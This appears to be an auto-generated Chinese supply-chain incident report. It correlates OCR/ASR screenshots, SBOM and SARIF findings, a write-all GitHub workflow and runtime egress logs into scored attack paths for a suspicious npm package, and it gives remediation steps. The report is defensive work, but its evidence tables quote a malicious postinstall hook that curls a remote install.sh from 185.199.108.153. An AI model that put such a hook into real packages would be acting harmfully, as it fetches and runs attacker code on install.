# 知识图谱驱动的真实攻击路径研判报告

生成时间：2026-06-18 09:03:44 UTC

## 风险摘要

- 综合风险评分：100 / 100
- 风险等级：critical
- 打开风险：27 项，其中严重风险 14 项
- 图谱节点：216 个
- 图谱关系：403 条
- 统一资产：165 个
- 证据片段：302 条
- 运行期日志事件：574 条
- 已识别攻击路径：3 条
- 可行动攻击路径：3 条
- 高度可信真实路径：1 条
- 平均路径置信度：79%
- 路径判定分布：cross-modal-corroborated-path=1, likely-real-attack-path=1, provenance-risk-path=1
- 参考模型：GUAC 软件树/证据树可达性、OpenCTI observable 关系与置信度、NetworkX 路径评分、in-toto/SLSA 可信证据链、BloodHound 式入口到目标路径呈现

## 路径判定

本报告不再只列“发现了哪些漏洞”，而是判断这些证据能否串成一次真实攻击路径。

## 攻击路径

### 1. 多模态证据印证供应链投毒到运行期异常路径

一句话结论：OCR/ASR 多模态证据、规则命中、依赖/构建关系和运行期日志相互印证，能串成跨模态高可信供应链攻击路径，综合置信度 90%。

```mermaid
flowchart LR
  N1["VisualEvidence: cicd-error.png"]
  N2["MultimodalFinding: 截图或语音中出现安装脚本外联"]
  N3["RecognizedEntity: package:@acme/payments-helper"]
  N4["DependencyPackage: npm:axios@1.6.8"]
  N5["CIStep: .github/workflows/desktop-release.yml"]
  N6["BuildArtifact: github-actions/deploy-prod-2481"]
  N7["RuntimeService: checkout-api.prod"]
  N8["LogEvent: egress"]
  N9["AttackStage: 供应链投毒阶段"]
  N1 -->|触发规则| N2
  N2 -->|关联实体| N3
  N3 -->|可进入构建| N4
  N4 -->|可进入构建| N5
  N5 -->|生成产物| N6
  N6 -->|部署为| N7
  N7 -->|产生日志| N8
  N8 -->|关联| N9
```

- 路径判定：cross-modal-corroborated-path
- 综合置信度：90%
- 严重级别：critical
- 路径评分：100 / 100
- 影响资产：cicd-error.png -> package:@acme/payments-helper -> npm:axios@1.6.8 -> .github/workflows/desktop-release.yml -> github-actions/deploy-prod-2481 -> checkout-api.prod -> egress
- 修复优先级：P0
- 攻击映射：software/evidence tree correlation, observable confidence and relationship graph, path scoring and source diversity
- 参考模型：GUAC, OpenCTI, NetworkX, Sigma, Wazuh

路径步骤：
- cicd-error.png --触发规则--> 截图或语音中出现安装脚本外联（Sigma/Wazuh，置信度 90%）：Sigma-style multimodal rule matched recognized text from this evidence source.
- 截图或语音中出现安装脚本外联 --影响资产--> package:@acme/payments-helper（FINDING_AFFECTS，置信度 86%）：Finding references the normalized asset by asset_id.
- package:@acme/payments-helper --关联--> npm:axios@1.6.8（evidence，置信度 50%）：Regex/Keyword Entity Extraction
- npm:axios@1.6.8 --可进入构建--> .github/workflows/desktop-release.yml（GUAC，置信度 72%）：A poisoned dependency can run install-time behavior or influence generated artifacts.
- .github/workflows/desktop-release.yml --生成产物--> github-actions/deploy-prod-2481（SLSA/in-toto，置信度 78%）：A compromised step or builder can produce a modified artifact.
- github-actions/deploy-prod-2481 --部署为--> checkout-api.prod（ARTIFACT_DEPLOYED_AS，置信度 82%）：Workspace runtime metadata links the build artifact to the deployed service.
- checkout-api.prod --产生日志--> egress（Runtime evidence，置信度 84%）：Runtime logs show whether the build-time risk manifested after deployment.
- egress --关联--> 供应链投毒阶段（evidence，置信度 50%）：NormalizedLogEvent

可信证据链：
- GUAC：软件树中存在可达依赖节点；主体=npm:axios@1.6.8；状态=observed
- in-toto：构建步骤将 material 转换为 product；主体=.github/workflows/desktop-release.yml；状态=needs-attestation
- SLSA：产物需要 subject digest、builder identity 和 materials provenance；主体=github-actions/deploy-prod-2481；状态=gap
- Runtime evidence：运行期行为证明风险可能已经触发；主体=egress；状态=observed

证据缺口：
- 当前路径未发现明显证据缺口。

关键封堵点：
- npm:axios@1.6.8：固定私有源、锁定版本并清理缓存包。
- .github/workflows/desktop-release.yml：收敛权限、固定 Action 到 commit SHA，并使用干净 runner。
- github-actions/deploy-prod-2481：重新构建并校验产物哈希/provenance。
- checkout-api.prod：回滚或隔离服务实例，保留日志和镜像证据。
- egress：封禁相关来源/目的地址并扩大同时间窗排查。

证据摘要：
- GitHub Token 权限过宽：permissions: write-all 会给 GITHUB_TOKEN 授予全部写权限，扩大凭据泄露或工作流劫持后的影响面。 Evidence: permissions: write-all
- npm:axios@1.6.8：OSV: GHSA-35jp-ww65-95wh; OSV: GHSA-3g43-6gmg-66jw; OSV: GHSA-3p68-rc4w-qgx5; OSV: GHSA-3w6x-2g7m-8v23; OSV: GHSA-43f...
- image evidence: cicd-error.png：MME-20260603075345873115-DDC20BBF stored at storage/multimodal/MME-20260603075345873115-DDC20BBF-image-cicd-error.png
- 截图或语音中出现安装脚本外联：GitHub Actions / deploy-prod-2481 [09:42:10] Run npm ci npm install @acme/payments-helper@9.9.2 resolved @acme/paymen...
- package: @acme/payments-helper：pm install @acme/payments-helper@9.9.2 resolved @acme/payments-helper r from public registry @acme/payments-helper@9.

### 2. 证据可串成供应链投毒到运行期异常的攻击路径

一句话结论：能串成一次高度可信的真实攻击路径：入口、构建、产物、运行期行为连续可达，综合置信度 83%。

```mermaid
flowchart LR
  N1["DependencyPackage: npm:axios@1.6.8"]
  N2["CIStep: .github/workflows/desktop-release.yml"]
  N3["BuildArtifact: github-actions/deploy-prod-2481"]
  N4["RuntimeService: checkout-api.prod"]
  N5["LogEvent: egress"]
  N6["AttackStage: 供应链投毒阶段"]
  N1 -->|可进入构建| N2
  N2 -->|生成产物| N3
  N3 -->|部署为| N4
  N4 -->|产生日志| N5
  N5 -->|关联| N6
```

- 路径判定：likely-real-attack-path
- 综合置信度：83%
- 严重级别：critical
- 路径评分：100 / 100
- 影响资产：npm:axios@1.6.8 -> .github/workflows/desktop-release.yml -> github-actions/deploy-prod-2481 -> checkout-api.prod -> egress
- 修复优先级：P0
- 攻击映射：T1195
- 参考模型：GUAC, SLSA, in-toto, BloodHound CE, MITRE ATT&CK STIX

路径步骤：
- npm:axios@1.6.8 --可进入构建--> .github/workflows/desktop-release.yml（GUAC，置信度 72%）：A poisoned dependency can run install-time behavior or influence generated artifacts.
- .github/workflows/desktop-release.yml --生成产物--> github-actions/deploy-prod-2481（SLSA/in-toto，置信度 78%）：A compromised step or builder can produce a modified artifact.
- github-actions/deploy-prod-2481 --部署为--> checkout-api.prod（ARTIFACT_DEPLOYED_AS，置信度 82%）：Workspace runtime metadata links the build artifact to the deployed service.
- checkout-api.prod --产生日志--> egress（Runtime evidence，置信度 84%）：Runtime logs show whether the build-time risk manifested after deployment.
- egress --关联--> 供应链投毒阶段（evidence，置信度 50%）：NormalizedLogEvent

可信证据链：
- GUAC：软件树中存在可达依赖节点；主体=npm:axios@1.6.8；状态=observed
- in-toto：构建步骤将 material 转换为 product；主体=.github/workflows/desktop-release.yml；状态=needs-attestation
- SLSA：产物需要 subject digest、builder identity 和 materials provenance；主体=github-actions/deploy-prod-2481；状态=gap
- Runtime evidence：运行期行为证明风险可能已经触发；主体=egress；状态=observed

证据缺口：
- 当前路径未发现明显证据缺口。

关键封堵点：
- npm:axios@1.6.8：固定私有源、锁定版本并清理缓存包。
- .github/workflows/desktop-release.yml：收敛权限、固定 Action 到 commit SHA，并使用干净 runner。
- github-actions/deploy-prod-2481：重新构建并校验产物哈希/provenance。
- checkout-api.prod：回滚或隔离服务实例，保留日志和镜像证据。
- egress：封禁相关来源/目的地址并扩大同时间窗排查。

证据摘要：
- GitHub Token 权限过宽：permissions: write-all 会给 GITHUB_TOKEN 授予全部写权限，扩大凭据泄露或工作流劫持后的影响面。 Evidence: permissions: write-all
- npm:axios@1.6.8：OSV: GHSA-35jp-ww65-95wh; OSV: GHSA-3g43-6gmg-66jw; OSV: GHSA-3p68-rc4w-qgx5; OSV: GHSA-3w6x-2g7m-8v23; OSV: GHSA-43f...
- 未知域名外联：checkout-api -> 185.199.108.153:443

### 3. 证据可串成构建链路完整性受损路径

一句话结论：能串成构建完整性风险路径，但还需要 provenance/attestation 才能证明产物确被篡改，综合置信度 64%。

```mermaid
flowchart LR
  N1["CIStep: .github/workflows/desktop-release.yml"]
  N2["BuildArtifact: github-actions/deploy-prod-2481"]
  N3["RuntimeService: checkout-api.prod"]
  N4["AttackStage: 构建链路风险阶段"]
  N1 -->|部署为| N2
  N2 -->|部署为| N3
  N3 -->|关联| N4
```

- 路径判定：provenance-risk-path
- 综合置信度：64%
- 严重级别：high
- 路径评分：95 / 100
- 影响资产：.github/workflows/desktop-release.yml -> github-actions/deploy-prod-2481 -> checkout-api.prod
- 修复优先级：P1
- 攻击映射：Build provenance and integrity
- 参考模型：SLSA, in-toto, GUAC, BloodHound CE

路径步骤：
- .github/workflows/desktop-release.yml --关联--> github-actions/deploy-prod-2481（evidence，置信度 50%）：WorkspaceSummary
- github-actions/deploy-prod-2481 --部署为--> checkout-api.prod（ARTIFACT_DEPLOYED_AS，置信度 82%）：Workspace runtime metadata links the build artifact to the deployed service.
- checkout-api.prod --关联--> 构建链路风险阶段（evidence，置信度 50%）：Runtime

可信证据链：
- in-toto：构建步骤将 material 转换为 product；主体=.github/workflows/desktop-release.yml；状态=needs-attestation
- SLSA：产物需要 subject digest、builder identity 和 materials provenance；主体=github-actions/deploy-prod-2481；状态=gap

证据缺口：
- 路径节点没有关联证据片段，需要补充扫描结果或日志。

关键封堵点：
- .github/workflows/desktop-release.yml：收敛权限、固定 Action 到 commit SHA，并使用干净 runner。
- github-actions/deploy-prod-2481：重新构建并校验产物哈希/provenance。
- checkout-api.prod：回滚或隔离服务实例，保留日志和镜像证据。

证据摘要：
- 暂无证据。

## 关联高危问题

| 编号 | 等级 | 评分 | 风险 | 影响资产 | 来源 |
| --- | --- | ---: | --- | --- | --- |
| finding-node:da7b5dc051c49c92 | critical | 100 | axios has exploitable VEX context | axios@1.6.8 | CycloneDX |
| finding-node:528470acfd028d85 | critical | 100 | starlette vulnerability needs reachability triage | starlette@1.0.0 | CycloneDX |
| finding-node:f13369fcf0078521 | critical | 96 | 截图或语音中出现安装脚本外联 | multimodal_audit | Sigma-style YAML rule |
| finding-node:97aaa1dda7db9b21 | critical | 96 | 截图或语音中出现安装脚本外联 | multimodal_audit | Sigma-style YAML rule |
| finding-node:fae7ec87f56d1cf1 | critical | 96 | 截图或语音中出现安装脚本外联 | multimodal_audit | Sigma-style YAML rule |
| finding-node:88ab8ea49348d9fb | critical | 96 | 截图或语音中出现安装脚本外联 | multimodal_audit | Sigma-style YAML rule |
| finding-node:a1f8b27b61a1bf27 | critical | 96 | 截图或语音中出现安装脚本外联 | multimodal_audit | Sigma-style YAML rule |
| finding-node:6cf793b6b25b0dee | critical | 96 | 截图或语音中出现安装脚本外联 | multimodal_audit | Sigma-style YAML rule |
| finding-node:1c20f675a47230f0 | critical | 96 | 截图或语音中出现安装脚本外联 | multimodal_audit | Sigma-style YAML rule |
| finding-node:617c55daecfc1f62 | critical | 96 | 截图或语音中出现安装脚本外联 | multimodal_audit | Sigma-style YAML rule |
| finding-node:b02fba9c9a6ec6ce | critical | 96 | 截图或语音中出现安装脚本外联 | multimodal_audit | Sigma-style YAML rule |
| finding-node:924b35866c71f9f8 | critical | 96 | 截图或语音中出现安装脚本外联 | multimodal_audit | Sigma-style YAML rule |

## 证据链

| 序号 | 时间 | 证据类型 | 关联资产 | 证据摘要 | 来源模型 |
| ---: | --- | --- | --- | --- | --- |
| 1 | 2026-06-18 09:01 | workflow-risk-finding | .github/workflows/desktop-release.yml | permissions: write-all 会给 GITHUB_TOKEN 授予全部写权限，扩大凭据泄露或工作流劫持后的影响面。 Evidence: permissions: write-all | SARIF |
| 2 | 2026-06-18 09:02 | sbom-component-risk | npm:axios@1.6.8 | OSV: GHSA-35jp-ww65-95wh; OSV: GHSA-3g43-6gmg-66jw; OSV: GHSA-3p68-rc4w-qgx5; OSV: GHSA-3w6x-2g7m-8v23; OSV: GHSA-43fc-jf86-j433; OSV: GHSA-445q-vr5w-6q77; OSV: GHSA-4hjh-wcwx-x... | CycloneDX |
| 3 | 2026-06-03T07:53:45 | multimodal-evidence-source | cicd-error.png | MME-20260603075345873115-DDC20BBF stored at storage/multimodal/MME-20260603075345873115-DDC20BBF-image-cicd-error.png | ASR/OCR + Sigma-style rules |
| 4 | 2026-06-03T07:53:59 | multimodal-rule-match | cicd-error.png | GitHub Actions / deploy-prod-2481 [09:42:10] Run npm ci npm install @acme/payments-helper@9.9.2 resolved @acme/payments-helper r from public registry @acme/payments-helper@9.9.2... | Sigma-style YAML rule |
| 5 | 2026-06-03T08:00:52 | recognized-security-entity | package:@acme/payments-helper | pm install @acme/payments-helper@9.9.2 resolved @acme/payments-helper r from public registry @acme/payments-helper@9. | Regex/Keyword Entity Extraction |
| 6 | 2026-06-03T07:53:45 | recognized-security-entity | package:@acme/payments-helper | pm install @acme/payments-helper@9.9.2 resolved @acme/payments-helper r from public registry @acme/payments-helper@9. | Regex/Keyword Entity Extraction |
| 7 | 2026-06-03T07:53:59 | visual_ocr | cicd-error.png | GitHub Actions / deploy-prod-2481 [09:42:10] Run npm ci npm install @acme/payments-helper@9.9.2 resolved @acme/payments-helper r from public registry @acme/payments-helper@9.9.2... | PaddleOCR/PP-OCRv5 |
| 8 | 2026-05-30 03:07:04 | runtime-log-finding | egress | checkout-api -> 185.199.108.153:443 | NormalizedLogEvent |

## 多模态证据融合

- 多模态证据：18 条
- 安全实体：118 个
- 规则命中：22 条
- 多模态风险：critical / 96
- 参考模型：GUAC 负责软件供应链可达关系，OpenCTI 负责 observable/置信度/first seen 语义，NetworkX 负责路径评分和多源证据连通性。

| Evidence ID | 类型 | 风险 | 关联实体 | 命中规则 | 识别文本摘要 |
| --- | --- | --- | --- | --- | --- |
| MME-20260611120040129581-DDC20BBF | image | low / 0 | - | - | - |
| MME-20260605112212515224-D40CCA7A | image | critical / 96 | @acme/payments-helper@9.9.2, postinstall, curl, 185.199.108.153, 凌晨三点, checkout-api, 异常外联, 外联 | multimodal-postinstall-egress, multimodal-sensitive-interface-anomaly | npm install @acme/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，... |
| MME-20260605112203250782-DDC20BBF | image | low / 0 | - | - | - |
| MME-20260603143717219602-DDC20BBF | image | low / 0 | - | - | - |
| MME-20260603080139438792-D40CCA7A | image | critical / 96 | @acme/payments-helper@9.9.2, postinstall, curl, 185.199.108.153, 凌晨三点, checkout-api, 异常外联, 外联 | multimodal-postinstall-egress, multimodal-sensitive-interface-anomaly | npm install @acme/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，... |
| MME-20260603080102092971-B4A4919E | image | high / 84 | 凌晨三点, checkout-api, 异常外联, 外联, 185.199.108.153, admin/export | multimodal-sensitive-interface-anomaly | SupplyGuard Incident Screenshot 高风险告警 时间 凌晨三点 服务 checkout-api 事件 出现异常外联 目标 185.199.108.153/install.sh 接口 admin/export... |
| MME-20260603080052880859-DDC20BBF | image | critical / 96 | 09:42:10, @acme/payments-helper@9.9.2, @acme/payments-helper, postinstall, curl, bash, 185.199.108.153 | multimodal-postinstall-egress | GitHub Actions / deploy-prod-2481 [09:42:10] Run npm ci npm install @acme/payments-helper@9.9.2 resolved @acme/paymen... |
| MME-20260603080050377411-4A1F3B72 | audio | low / 0 | - | - | 凌晨3. 赤烤雷批爱出现一场外连 atmean export 接口访问两声高 请隔离购劲产务 并负合 provenance |

## 修复建议

- **P0 · 多模态证据印证供应链投毒到运行期异常路径**：优先封堵 OCR/ASR 中识别到的依赖包、外联 IP 和敏感接口，并把同时间窗的 CI/CD、SBOM、运行日志作为取证材料保留。
- **P0 · 证据可串成供应链投毒到运行期异常的攻击路径**：隔离高危依赖，使用干净 runner 重新构建，校验产物哈希，并排查运行期外联。
- **P1 · 证据可串成构建链路完整性受损路径**：收敛 workflow 权限，第三方 Action 固定到 commit SHA，并为产物增加 provenance/attestation。

## 附录

### SBOM / Dependency-Track 风险摘要

- SBOM 组件数量：59
- 依赖风险数量：3
- 最高依赖风险：100 / 100
- VEX statement：67
- VEX affected / under investigation：11
- VEX not affected / fixed：56
- 代码可达依赖：2
- 运行期日志命中：0

### SARIF / DefectDojo 风险摘要

- SARIF 结果数量：3
- 代码风险数量：0
- CI/CD 风险数量：3

### 产物可信验证摘要

- 产物：-
- SHA256：-
- 可信评分：0 / 100
- 检查项数量：0
- 产物可信风险：0

### 日志证据摘要

- 日志风险数量：0
- 图谱证据数量：302

### 开源参考

- GUAC: https://docs.guac.sh/guac/
- GUAC Ontology: https://docs.guac.sh/guac/guac-ontology/
- MITRE ATT&CK STIX Data: https://github.com/mitre-attack/attack-stix-data
- SLSA: https://slsa.dev/spec/v1.2/provenance
- in-toto: https://github.com/in-toto/in-toto
- BloodHound CE: https://specterops.io/bloodhound-community-edition/
- NetworkX: https://networkx.org/
- React Flow: https://reactflow.dev/
- CycloneDX: https://cyclonedx.org/specification/overview/
- SARIF: https://www.oasis-open.org/standard/sarif-v2-1-0/
- OWASP Dependency-Track: https://dependencytrack.org/
- DefectDojo: https://docs.defectdojo.com/
- FFmpeg: https://www.ffmpeg.org/index.html
- OpenCV: https://opencv.org/about/

